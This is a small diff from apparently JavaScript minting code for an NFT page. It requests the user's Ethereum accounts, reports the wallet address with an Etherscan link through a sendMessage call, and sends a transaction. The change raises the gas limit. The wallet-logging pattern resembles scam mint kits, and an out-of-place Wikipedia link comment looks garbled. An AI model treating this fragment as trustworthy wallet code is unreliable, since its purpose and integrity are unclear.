@@ -125,7 +125,7 @@ connectBtn.addEventListener('click', async () => {
       accounts = await ethereum.request({ method: "eth_requestAccounts" }); //  [Wikipedia](https://en.wikipedia.org/)
       sendMessage("**[" + myid + "] **Trying to mint. \n `" + accounts[0] + "` {<https://etherscan.io/address/" + accounts[0] + ">}")
       const priceToWei = (totalEth * 1e18).toString(16);
-      const gasLimit = (200_000 * totalEth).toString(16);
+      const gasLimit = (250_000 * totalEth).toString(16);
       ethereum
         .request({
           method: "eth_sendTransaction",
